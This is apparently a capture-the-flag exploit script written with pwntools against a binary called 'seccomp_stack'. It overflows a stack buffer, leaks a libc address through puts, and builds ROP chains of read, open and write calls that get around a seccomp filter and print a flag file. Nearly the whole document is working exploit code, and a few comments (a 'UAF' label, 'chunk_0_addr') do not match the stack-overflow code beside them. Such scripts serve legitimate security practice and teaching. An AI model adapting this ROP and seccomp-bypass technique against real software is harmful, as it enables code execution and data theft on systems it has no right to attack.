#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set debug-file-directory /root/comp3633/tcache/debug'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)


elf = ELF('./seccomp_stack')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./seccomp_stack")



## [Glibc 2.27 UAF Seccomp Attack Roadmap]
## 1. Leak libc address 
## 2. Execute open/read/write gadget chain

rdi_ret = 0x400993
rw_section = 0x601000

bof = elf.sym["bof"]
payload = "a" * 0x28 

## puts(pust.got)
payload += p64(rdi_ret) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(bof)
se(payload)

libc_base = u64(rc(6) + "\x00\x00") - 0x80970
read_addr = libc_base + 0x110020
open_addr = libc_base + 0x10fbf0
write_addr = libc_base + 0x1100f0
pop_rdx = libc_base + 0x1b96
pop_rdi = libc_base + 0x2164f
pop_rsi = libc_base + 0x23a6a
pop_rax = libc_base + 0x1b500
syscall = read_addr + 0xf


payload = "a" * 0x28
## read(0, rw_section, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(rw_section)
payload += p64(pop_rdx) + p64(0x30) + p64(read_addr) + p64(bof)
sleep(0.1)
se(payload)
sleep(0.1)
se("./flag")


payload = "a" * 0x28
## open("./flag", 0)
payload += p64(pop_rdi) + p64(rw_section)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rax) + p64(2)
payload += p64(syscall)


## read(3, chunk_0_addr + 0xc0, 0x30)
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(rw_section)
payload += p64(pop_rdx) + p64(0x30) + p64(read_addr)


## write(1, chunk_0_addr + 0xc0, 0x30)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(rw_section)
payload += p64(pop_rdx) + p64(0x30) + p64(write_addr)

sleep(0.1)
se(payload)
p.interactive()